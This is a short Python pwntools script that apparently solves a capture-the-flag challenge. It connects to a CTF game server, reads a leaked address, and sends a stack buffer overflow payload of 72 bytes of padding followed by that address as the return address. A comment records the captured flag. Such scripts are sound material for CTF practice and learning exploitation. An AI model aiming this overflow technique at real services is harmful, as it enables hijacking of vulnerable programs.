#!/usr/bin/python3
# -*- coding : utf-8 -*-

from pwn import *

target = remote('game.ctf.ae', 3010)

padding = 'A' * 72

eip = target.recvline_contains(b'flag').decode()

info(eip)

eip = int(eip.replace('The flag is stored at ', ''), 16)

eip = p64(eip)

payload = padding.encode() + eip

print(payload)

target.sendline(payload)

print(target.recvall().decode())

#! FLAG : CTFAE{ToInfinityAndBeyond}
